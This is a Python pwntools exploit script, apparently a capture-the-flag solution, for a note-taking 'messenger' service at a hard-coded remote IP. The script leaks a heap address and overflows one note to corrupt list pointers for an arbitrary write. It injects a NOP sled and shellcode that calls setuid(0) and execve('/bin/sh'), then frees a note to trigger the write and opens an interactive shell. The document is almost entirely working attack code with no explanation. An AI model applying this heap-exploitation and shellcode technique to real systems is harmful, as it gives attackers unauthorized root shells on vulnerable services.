import time, pwn, os, struct

local = False
if local:
    s = pwn.remote("localhost", 2323)
    os.system("echo nye; pgrep messenger; echo bye")
    raw_input("> ")
else:
    s = pwn.remote("110.10.212.137", 3333)

print s.recvuntil(">> ")
def allocate_note(s, size, msg):
    s.send("L\n")
    print s.recv(1024)
    s.send("{}\n".format(size))
    print s.recv(1024)
    s.send("{}\n".format(msg))
    print s.recvuntil(">> ")

def change_note(s, index, size, msg):
    s.send("C\n")
    print s.recv(1024)
    s.send("{}\n".format(index))
    print s.recv(1024)
    s.send("{}\n".format(size))
    print s.recv(1024)
    s.send("{}\n".format(msg))
    print s.recvuntil(">> ")

def remove_note(s, index):
    s.send("R\n")
    print s.recv(1024)
    s.send("{}\n".format(index))
    print s.recvuntil(">> ")

def view_note(s, index):
    s.send("V\n")
    print s.recv(1024)
    s.send("{}\n".format(index))
    response = s.recvuntil(">> ").split("\n[L]")[0]
    return response

def build_payload(dest_addr, src_addr, shellcode):
    dest_addr = struct.pack('Q', dest_addr)
    src_addr = struct.pack('Q', src_addr)
    buffer = ''.join([
        '$'*32,
        'A'*8,
        'B'*8,
        '\xCC'*100
    ])

    buffer = ''.join([
        '$'*32,
        src_addr,
        dest_addr,
        shellcode
    ])

    return buffer

shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05\xcc"
allocate_note(s, 10, "A"*9)
allocate_note(s, 10, "B"*9)
change_note(s, 0, 32, "A"*31)
address = struct.unpack("I", view_note(s, 0)[-4:].strip().ljust(4, '\x00'))[0]
address = (address & 0xFFFFFF00 + 0x30) + (0x32 + 0x10) # address of first note + stuff before payload
print "hacker code at ", hex(address)
change_note(s, 0, 1000, build_payload(0x602070-8, address, "\x90"*18 + "\x90\xeb\x1f"+"\x90"*100+shellcode))
#change_note(s, 0, 1000, "A"*32)
remove_note(s, 1)

s.interactive()
